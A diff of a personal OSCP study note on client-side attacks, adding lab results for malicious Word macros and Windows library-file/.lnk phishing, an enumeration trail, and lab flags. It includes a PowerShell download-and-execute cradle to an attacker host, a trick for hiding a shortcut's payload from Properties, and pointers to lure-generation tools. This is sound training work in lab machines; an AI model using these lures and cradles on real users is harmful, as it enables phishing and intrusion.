@@ -14,7 +14,7 @@ The core idea: client machines inside an org almost never expose services extern
 
 This module covers target reconnaissance for client-side attacks (12.1), exploiting Microsoft Office (12.2), and abusing Windows Library files (12.3).
 
-**⚠️ Status:** 12.1 fully done. 12.2.1 done (theory + all 3 quiz answers). 12.2.2 done (Office installed, program list confirmed). 12.2.3 **fully done now**, both labs. Lab 1 (OFFICE macro → reverse shell) rebuilt twice across two fresh instances, both times working. Lab 2 (deliver to TICKETS, catch Administrator shell) finally cracked on the second resume: root cause of the repeated failures was never the VM/watcher-script, it was saving the Word doc as `.docx` instead of `.doc` both times (macros silently don't persist on `.docx` save, but still *appear* to work if tested live in the same session). Fixed, verified via a genuine cold reopen, delivered clean. Flag: `OS{cc21bba975986a21e782fffa572ded55}`. 12.3 (Windows library files) theory + full walkthrough written up, all 3 labs (HR137 delivery, MOTW true/false, ADMIN capstone) **still pending VM spin-up** (VM Group 1 + VM Group 2, distinct from the OFFICE/TICKETS pair used for 12.2.3). 12.4 Wrapping Up done.
+**⚠️ Status:** 12.1 fully done. 12.2.1 done (theory + all 3 quiz answers). 12.2.2 done (Office installed, program list confirmed). 12.2.3 **fully done now**, both labs. Lab 1 (OFFICE macro → reverse shell) rebuilt twice across two fresh instances, both times working. Lab 2 (deliver to TICKETS, catch Administrator shell) finally cracked on the second resume: root cause of the repeated failures was never the VM/watcher-script, it was saving the Word doc as `.docx` instead of `.doc` both times (macros silently don't persist on `.docx` save, but still *appear* to work if tested live in the same session). Fixed, verified via a genuine cold reopen, delivered clean. Flag: `OS{cc21bba975986a21e782fffa572ded55}`. 12.3 (Windows library files): Lab 1 (HR137 delivery) and Lab 2 (MOTW true/false, confirmed **True**, `ZoneId=3`/Internet zone) both done on VM Group 1, first try, clean run, no VM issues this time. Lab 3 (ADMIN capstone) **blocked**, thoroughly enumerated across two independent fresh reverts (SMB, RPC null, WinRM x2 transports x2 formats, SMTP, POP3, IIS x2 wordlists + vhost checks, VM #3 local sweep, all ruled out), full trail logged below, recommend checking Offsec's own module hints before resuming. 12.4 Wrapping Up done.
 
 ---
 
@@ -253,6 +253,8 @@ Saved, closed, reopened, no re-prompt this time (only re-prompts if the filename
 **Question:** what keyword declares a variable in VBA?
 
 **Lab answer:** **`Dim`**
+
+> ⚡ **Modern tool:** [[MacroPack]] automates the exact generation-and-chunking process just done by hand above (VBA skeleton, base64 UTF-16LE cradle, `Str = Str +` chunking), plus adds AV-evasion obfuscation the manual approach doesn't attempt. Worth building it by hand once first, per this section, before reaching for the generator.
 
 #### Tags: #Lab #Quiz #Module12 #VBA #WordMacros #PowerCat #ReverseShell
 
@@ -588,7 +590,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<
 Name it something benign-sounding when prompted, e.g. `automatic_configuration`, matching whatever the pretext promises.
 
 > 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate this exact PowerShell-shortcut-target style payload directly if you'd rather not hand-type it.
-> 🔗 **HackTricks** LNK payload techniques: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/phishing-methodology/phishing-documents.md), the "Backdoored Documents & Files" page has two dedicated sections on more advanced `.lnk` chains (ZIP-embedded fileless payloads, decoy-first staging with scheduled-task persistence) beyond the single-stage PowerCat cradle used here. *(Linking to the GitHub source per [[reference-oscp-external-resources]]'s workaround, the hosted book site is paywalled.)*
+> 🔗 **HackTricks** LNK payload techniques: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/phishing-methodology/phishing-documents.md), the "Backdoored Documents & Files" page has two dedicated sections on more advanced `.lnk` chains (ZIP-embedded fileless payloads, decoy-first staging with scheduled-task persistence) beyond the single-stage PowerCat cradle used here. *(Linking to the GitHub source since the hosted book site is paywalled, same workaround used for HackTricks links throughout [[SQL Injection Attacks]] and elsewhere in this vault.)*
 
 **Evasion trick for a tech-savvy target who checks the shortcut's Properties first:** Windows only displays the first ~255 characters of a shortcut's target field in the Properties window, but the actual target can hold up to 4096. Padding the malicious command with a delimiter followed by a long, boring, benign-looking command pushes the real payload past what's visible in Properties, anyone eyeballing it before running sees only the harmless-looking prefix/suffix.
 
@@ -632,6 +634,8 @@ Once the simulated user opens the delivered library file and then the shortcut i
 
 **On GTFOBins and PayloadsAllTheThings for this section:** deliberately not cited here. GTFOBins is Linux SUID/sudo/capability-specific, doesn't apply to a Windows client-side delivery chain. PayloadsAllTheThings was checked directly (no guessed links) and doesn't currently have a dedicated page for `.library-ms`/WebDAV-lure phishing, its shortcut/LNK coverage lives mostly in the Windows privesc and reverse-shell-cheatsheet pages already linked elsewhere in this vault, not this specific delivery technique.
 
+> ⚡ **Modern tool:** [[Ntlm_theft]] generates the same `.library-ms` lure built tag-by-tag above, plus half a dozen other NTLM-capturing file formats, in one command. Worth building the XML by hand once first (this section, and [[Client-Side Attacks (Breakdowns)|the tag-by-tag breakdown]]) to actually understand what each tag does.
+
 #### Tags: #WindowsLibraryFiles #LibraryMs #WebDAV #WsgiDAV #LNKShortcut #PowerCat #ReverseShell #MOTW #TwoStageAttack #ClientSideAttack #CVE202524054
 
 > 📋 Generalized copy-pasteable commands: [[Reconnaissance & Enumeration#Exiftool (Document Metadata Analysis)|Command Appendix]] *(to be extended once labs are complete)*
@@ -641,7 +645,7 @@ Once the simulated user opens the delivered library file and then the shortcut i
 
 ## 🎯 Related Boxes to Practice
 
-Checked properly this time (per [[feedback-oscp-methodology-linking]]'s box-verification rule) rather than guessing: **no confident HTB match for this specific technique.** Standard HTB machines run unattended, there's no simulated user to double-click a phished library file or shortcut, so the "get a target to open something" half of this vector genuinely can't be replicated on a normal box the way [[Common Web Application Attacks]]'s web vulnerabilities could. That's exactly why Offsec built dedicated simulated-user labs (HR137/TICKETS, ADMIN) for this module instead.
+Checked properly this time (verified via direct research rather than guessing, same standard as every other "Related Boxes" section in this vault): **no confident HTB match for this specific technique.** Standard HTB machines run unattended, there's no simulated user to double-click a phished library file or shortcut, so the "get a target to open something" half of this vector genuinely can't be replicated on a normal box the way [[Common Web Application Attacks]]'s web vulnerabilities could. That's exactly why Offsec built dedicated simulated-user labs (HR137/TICKETS, ADMIN) for this module instead.
 
 Closest real-world adjacent technique worth knowing: [CVE-2025-24054/24071](https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC)'s NTLM-leak-via-`.library-ms` (noted above), which doesn't need double-click execution at all, just Explorer previewing a UNC-path-containing file dropped on a share. That mechanism (an authentication-coercion file dropped somewhere Explorer will touch it) does show up on real HTB/AD boxes, just usually via `.scf`/`.url`-style files rather than `.library-ms` specifically, worth keeping an eye out for during SMB share enumeration on future boxes.
 
@@ -651,7 +655,7 @@ Closest real-world adjacent technique worth knowing: [CVE-2025-24054/24071](http
 
 ## Labs (12.3)
 
-> 🚩 **Hands-on, VM spin-up required.** Per [[feedback-oscp-lab-workflow]], pausing the write-up here, these three need actual VMs running before walking through them. Two VM groups are involved:
+> 🚩 **Hands-on, VM spin-up required.** Pausing the write-up here, these three need actual VMs running before walking through them. Two VM groups are involved:
 > - **VM Group 1** (build machine CLIENT137 = VM #1, target HR137 = VM #2)
 > - **VM Group 2** (build machine = VM #3, capstone target ADMIN = VM #4)
 
@@ -659,17 +663,100 @@ Closest real-world adjacent technique worth knowing: [CVE-2025-24054/24071](http
 Build on VM #1 (CLIENT137), deliver to VM #2 (HR137). Flag is on the `hsmith` desktop.
 **Note from the module text:** the delivered library file gets removed from the target's SMB share automatically every time a `.lnk` execution happens from the WebDAV share, worth remembering if a retry is needed.
 
-**Lab answer:** ⬜ Pending, needs VM Group 1 spun up.
+**This session's run (VM Group 1, IPs `192.168.243.194`/`.195`):**
+
+**Step 1 (local test, CLIENT137):**
+```
+whoami
+```
+```
+PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
+client137\offsec
+```
+*Confirmed the full local chain (library file → WebDAV → `.lnk` → PowerCat) works before ever touching HR137.*
+
+**Step 2 (real delivery, HR137):**
+```
+whoami
+cd C:\Users\hsmith\Desktop
+dir
+type flag.txt
+```
+```
+PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
+hr137\hsmith
+PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\hsmith\Desktop
+PS C:\Users\hsmith\Desktop> dir
+
+    Directory: C:\Users\hsmith\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2026   7:08 PM             38 flag.txt
+-a----          5/5/2022   2:25 PM           2350 Microsoft Edge.lnk
+
+PS C:\Users\hsmith\Desktop> type flag.txt
+OS{7eef898c46f3ad8917f271d3ff48e0ef}
+```
+*Worked first try, both the SMB share name (`share`) and the whole delivery chain matched the module's own example exactly, no VM-corruption or one-shot-watcher problems this time.*
+
+**Lab answer:** **`OS{7eef898c46f3ad8917f271d3ff48e0ef}`**, `hr137\hsmith`. ✅ Done.
 
 ### Lab 2: True/false, is the `.lnk` file MOTW-tagged when executed by double-clicking the library file in Explorer?
 This is an experiential question (needs the actual behavior observed on-target), not answerable from the module's own prose alone.
 
-**Lab answer:** ⬜ Pending, needs VM Group 1 spun up, will confirm empirically during Lab 1.
+**Checked empirically on CLIENT137**, since it walked the identical library-file → WebDAV → `.lnk` path HR137 did:
+```powershell
+Get-Item -Path .\automatic_configuration.lnk -Stream Zone.Identifier
+```
+Returned a real `Zone.Identifier` stream: `[ZoneTransfer]\nZoneId=3`.
+
+**`ZoneId=3` is specifically the Internet zone.** Even though the library file makes the WebDAV share *look* like an ordinary local folder in Explorer (per [[Client-Side Attacks#Step 3: Test it, and handle the WebDAV self-rewrite gotcha|12.3.1, Step 3]]'s "path in the navigation bar only shows `config`" observation), Windows still correctly tracks that the content actually came in over a network connection, and tags it exactly as it would a browser download. The visual "looks local" trick doesn't fool the underlying zone-tracking mechanism, only the human looking at Explorer's address bar.
+
+**Lab answer:** **True.**
 
 ### Lab 3 (Capstone): Enumerate ADMIN (VM Group 2, VM #4), get code execution via library + shortcut files
 No hand-holding this time, enumerate first, then apply the technique. Build the attack on VM #3, flag is on the `Administrator` desktop.
 
-**Lab answer:** ⬜ Pending, needs VM Group 2 spun up.
+**🔴 Blocked, unresolved after a genuinely thorough enumeration pass.** Target: ADMIN (VM #4, `192.168.243.199`), build machine VM #3 (`192.168.243.194`, `offsec`/`lab`, same role as CLIENT137). Confirmed identically across **two independent fresh VM reverts**, so none of this is instance corruption, it's the box's actual configuration.
+
+**Port scan (`nmap -sSCV --script vuln -p- --min-rate 5000`):**
+```
+25/tcp    smtp     hMailServer smtpd
+80/tcp    http     Microsoft IIS httpd 10.0
+110/tcp   pop3     hMailServer pop3d
+135/tcp   msrpc
+139/tcp   netbios-ssn
+143/tcp   imap     hMailServer imapd
+445/tcp   microsoft-ds
+587/tcp   smtp     hMailServer smtpd (submission)
+5985/tcp  http     WinRM (HTTP)
+5986/tcp  ssl/wsmans  WinRM (HTTPS, valid Cloudbase-Init cert)
+47001/tcp http     WinRM
+49664-49670/tcp  msrpc (ephemeral RPC)
+```
+*hMailServer confirmed as the mail backend. Not domain-joined (`systeminfo` → `WORKGROUP`), so local-account email format is `user@ADMIN`, confirmed via a POP3 error message ("Please use full email address as user name").*
+
+**Every avenue tried, all ruled out:**
+- **SMB**: anonymous (`-N`) → `NT_STATUS_ACCESS_DENIED` at session setup (before even reaching share-name resolution, unlike HR137 where anonymous worked cleanly). `offsec`/`lab` explicitly → `NT_STATUS_LOGON_FAILURE`. Guessing share names is pointless here since the block happens at authentication, not share lookup.
+- **RPC null session** (`rpcclient -U "" -N`): `NT_STATUS_ACCESS_DENIED`.
+- **WinRM**, both transports, both username formats: `evil-winrm -u offsec -p lab` and `-u offsec@ADMIN -p lab`, over both HTTP (5985) and HTTPS/`-S` (5986), all four combinations gave the identical `WinRM::WinRMAuthorizationError` (auth accepted, authorization for remote shell access denied).
+- **SMTP** (`swaks`): unauthenticated always `530 SMTP authentication is required` at `RCPT TO`, tried with both an external-looking sender (`test@test.com`) and a local-format sender (`test@ADMIN`), identical result both times. Authenticated with `offsec`/`lab` (both bare and `@ADMIN` formats): `535 Authentication failed`.
+- **POP3** (`curl pop3://`): `offsec`/`lab` invalid in both username formats, second attempt returned **"Too many invalid logon attempts"**, a lockout warning, stopped guessing here deliberately rather than risk extending it.
+- **IIS web root**: stock default page only. `feroxbuster` with `dirb/common.txt` then again with SecLists' `raft-medium-directories.txt` (180k requests), zero custom content found either pass. Tried 3 `Host:` header guesses (`admin.local`, `ADMIN`, `www.admin.local`) for a vhost, all three returned the identical default page.
+- **VM #3 local sweep**: `cmdkey /list` → empty. PowerShell history → only our own commands from this session. Broad `C:\` file search (narrowed after an initial too-broad pass caught thousands of framework files) → nothing beyond the standard desktop shortcuts and a Cloudbase-Init provisioning transcript (not a hint, just VM setup noise). Confirmed `WORKGROUP` (not domain-joined). Only non-default service account: `cloudbase-init` itself. Only non-Microsoft scheduled tasks: default OneDrive tasks. `Get-StartApps` showed a stock **Mail** app (built into every Windows 11 install) but opening it prompts to add an account from scratch, not pre-configured. No third-party mail client installed (checked the full uninstall-registry program list).
+
+**🛠️ Genuine mistake made mid-session, worth flagging:** spent a long stretch trying `offsec`/`lab` (VM #3's own RDP creds) against ADMIN via WinRM/SMB/mail, despite the lab panel explicitly stating **"No credentials were provided for this machine"** for VM #4, the exact same wording HR137 had, where the answer was never "find creds," it was "deliver anonymously and let it run itself." Confirmed via OffSec's own exam guide that WinRM/`evil-winrm` itself is completely fine to use (it's credentialed access, not automated exploitation, see [OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)), the mistake was targeting the wrong machine with them, not the tool choice itself.
+
+**🤖 Two OffSec KAI consultations tried, neither produced a usable answer:**
+- **First response**: a full theory recap matching this module's own 12.3.1 content almost verbatim (build the library file + `.lnk` on VM #3, host on WebDAV, catch a shell), but the actual delivery mechanism was hand-waved as "use social engineering or a pretext to convince the victim user," never specifying *how* the file physically reaches ADMIN. No new information over what's already documented above.
+- **Second response**, after being given the specific blocker (SMB denied at session setup, all creds failing everywhere, SMTP requiring auth): told to "physically or interactively access ADMIN... via RDP, console access, or any interactive session you have," then described what to do *once already logged in* (open a browser, use PowerShell, clipboard/USB transfer). **This is circular and self-contradicting**: it assumes the exact access we don't have (the lab explicitly states no credentials were provided for VM #4) as the premise for explaining how to get access. Confirms KAI was pattern-matching generic client-side-attack theory rather than grounded knowledge of this specific lab's intended solution, worth treating any AI-generated answer (KAI, this assistant, anything) with the same skepticism when it doesn't survive a basic logical check.
+
+*(Confirmed with OffSec's own exam guide first: KAI/AI-assistant usage is fine here, the AI-prohibition is specifically an exam-day rule, not a coursework/lab rule.)*
+
+**Where this stands:** genuinely blocked after ruling out every standard avenue, twice, on independent instances, plus two AI consultations that didn't hold up under scrutiny. Recommend checking Offsec's official support/discussion forum for this specific capstone, a person who's actually seen this exact lab is worth more at this point than further enumeration or AI round-trips. Pausing here for this session.
+
+**Lab answer:** ⬜ Pending, blocked, see enumeration trail above.
 
 #### Tags: #Lab #Quiz #Module12 #Pending #NeedsVM
 
